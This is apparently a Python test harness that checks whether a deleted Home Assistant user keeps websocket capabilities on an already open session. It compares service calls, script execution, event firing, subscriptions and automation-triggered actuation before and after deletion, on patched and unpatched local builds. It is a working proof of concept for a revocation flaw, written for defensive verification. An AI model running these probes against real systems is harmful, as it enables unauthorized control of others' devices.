"""P0 EXPERIMENT 3 - full defense-completeness matrix.

Closure was previously shown for two headline capabilities. This enumerates the
observable post-removal capability surface and records, for each, whether a
DELETED principal can still exercise it. Run under the patched and unpatched
builds; the patched run must show no reachable capability.

Each probe is preceded by a pre-delete control so a denial after removal cannot
be confused with an operation the principal never had.
"""
import asyncio, json, sys, time
import aiohttp, websockets
BASE="http://localhost:8124"; WS="ws://localhost:8124/api/websocket"; CID="http://localhost:8124/"
OWNER=("tsowner","Owner-Passw0rd-123"); PW="Member-Passw0rd-123"; EID="input_boolean.ts_probe"
ARM=sys.argv[1] if len(sys.argv)>1 else "run"
log=lambda m: print(m, flush=True)
async def tokc(s,c):
    async with s.post(f"{BASE}/auth/token",data={"grant_type":"authorization_code","code":c,"client_id":CID}) as r: return await r.json()
async def login(s,u,p):
    async with s.post(f"{BASE}/auth/login_flow",json={"client_id":CID,"handler":["homeassistant",None],"redirect_uri":CID,"type":"authorize"}) as r: f=(await r.json())["flow_id"]
    async with s.post(f"{BASE}/auth/login_flow/{f}",json={"client_id":CID,"username":u,"password":p}) as r:
        j=await r.json()
        if "result" not in j: raise SystemExit(f"login {u}: {j}")
    return (await tokc(s,j["result"]))["access_token"]
class C:
    def __init__(s,ws): s.ws,s.id=ws,0
    async def cmd(s,**kw):
        s.id+=1; await s.ws.send(json.dumps({"id":s.id,**kw}))
        while True:
            m=json.loads(await asyncio.wait_for(s.ws.recv(),timeout=15))
            if m.get("id")==s.id and m["type"]=="result": return m
    async def drain(s,secs):
        out=[];end=asyncio.get_event_loop().time()+secs
        while asyncio.get_event_loop().time()<end:
            try: out.append(json.loads(await asyncio.wait_for(s.ws.recv(),timeout=max(0.1,end-asyncio.get_event_loop().time()))))
            except Exception: break     # timeout OR closed connection
        return out
async def conn(t):
    ws=await websockets.connect(WS,max_size=None); await ws.recv()
    await ws.send(json.dumps({"type":"auth","access_token":t})); m=json.loads(await ws.recv())
    return (C(ws),m) if m["type"]=="auth_ok" else (None,m)
async def state(c,e):
    r=await c.cmd(type="get_states")
    for s in (r.get("result") or []):
        if s["entity_id"]==e: return s["state"]

async def probes(m, owner, phase):
    """Returns capability -> reachable(bool)."""
    out={}
    async def ok(k, coro):
        try: r=await coro; out[k]=bool(r.get("success"))
        except Exception: out[k]=False
    # data-bearing, not status-bearing: TSMON returns success with an EMPTY list,
    # so "did the command succeed" is the wrong question for a read capability.
    try:
        r=await m.cmd(type="get_states"); out["state_read"]=len(r.get("result") or [])>0
    except Exception: out["state_read"]=False
    out["entity_enum"]=out["state_read"]
    await ok("user_enum",       m.cmd(type="config/auth/list"))
    await ok("direct_service_call", m.cmd(type="call_service",domain="input_boolean",service="turn_on",target={"entity_id":EID}))
    await ok("script_execution",m.cmd(type="execute_script",sequence=[{"service":"input_boolean.turn_on","target":{"entity_id":EID}}]))
    await ok("event_firing",    m.cmd(type="fire_event",event_type="ts_matrix_probe"))
    await ok("subscribe_trigger", m.cmd(type="subscribe_trigger",trigger={"platform":"event","event_type":"ts_x"}))
    # a genuinely admin-gated config command, not the public get_config
    await ok("automation_admin", m.cmd(type="config/core/check_config"))
    # NEW subscription: does it actually deliver, not merely register?
    try:
        r=await m.cmd(type="subscribe_events",event_type="state_changed")
        reg=bool(r.get("success"))
    except Exception: reg=False
    await owner.cmd(type="call_service",domain="input_boolean",service="toggle",target={"entity_id":EID})
    ev=await m.drain(2.5)
    out["new_subscription"]=reg and any(e.get("type")=="event" for e in ev)

    # existing subscription still delivering?
    await owner.cmd(type="fire_event",event_type="state_probe_ping")
    await owner.cmd(type="call_service",domain="input_boolean",service="toggle",target={"entity_id":EID})
    evs=await m.drain(2.5)
    out["existing_subscription_delivery"]=any(e.get("type")=="event" for e in evs)
    # deputy chain: fire event -> automation -> actuation
    await owner.cmd(type="call_service",domain="input_boolean",service="turn_off",target={"entity_id":EID}); await asyncio.sleep(0.5)
    try: await m.cmd(type="fire_event",event_type="ts_deputy_trigger")
    except Exception: pass
    await asyncio.sleep(2)
    out["deputy_actuation"]=(await state(owner,EID))=="on"
    return out

async def main():
    async with aiohttp.ClientSession() as s:
        otok=await login(s,*OWNER); owner,_=await conn(otok)
        auto={"alias":"ts deputy probe","trigger":[{"platform":"event","event_type":"ts_deputy_trigger"}],
              "action":[{"service":"input_boolean.turn_on","target":{"entity_id":EID}}],"mode":"single"}
        async with s.post(f"{BASE}/api/config/automation/config/tsdeputy",
            headers={"Authorization":f"Bearer {otok}","Content-Type":"application/json"},json=auto) as r: await r.text()
        await owner.cmd(type="call_service",domain="automation",service="reload"); await asyncio.sleep(2)
        await owner.cmd(type="call_service",domain="automation",service="turn_on",target={"entity_id":"automation.ts_deputy_probe"})
        await asyncio.sleep(1)
        u=f"matrix_{ARM}"
        r=await owner.cmd(type="config/auth/create",name=f"Matrix {ARM}",group_ids=["system-admin"],local_only=False)
        uid=r["result"]["user"]["id"]
        await owner.cmd(type="config/auth_provider/homeassistant/create",user_id=uid,username=u,password=PW)
        mtok=await login(s,u,PW); m,_=await conn(mtok)
        pre=await probes(m,owner,"pre")
        await owner.cmd(type="config/auth/delete",user_id=uid); await asyncio.sleep(2)
        # A terminated socket is a RESULT, not an error: under session-termination
        # defences every capability becomes unreachable because the channel is gone.
        try:
            post=await probes(m,owner,"post")
        except Exception as e:
            post={k: False for k in pre}
            log(f"  [socket terminated on removal: {type(e).__name__}] all capabilities unreachable")
        log(f"\n=== POST-REMOVAL CAPABILITY MATRIX [{ARM}] ===")
        log(f"  {'capability':32s} {'pre-delete':>11s} {'post-delete':>12s}")
        residual=[]
        for k in pre:
            p,q=pre[k],post.get(k,False)
            if p and q: residual.append(k)
            log(f"  {k:32s} {str(p):>11s} {str(q):>12s}{'   <== RESIDUAL' if (p and q) else ''}")
        log(f"\n  residual capabilities: {len(residual)}  {residual}")
        json.dump({"arm":ARM,"pre":pre,"post":post,"residual":residual}, open(f"/tmp/matrix_{ARM}.json","w"))
        try: await m.ws.close()
        except Exception: pass
        await owner.ws.close()
asyncio.run(main())
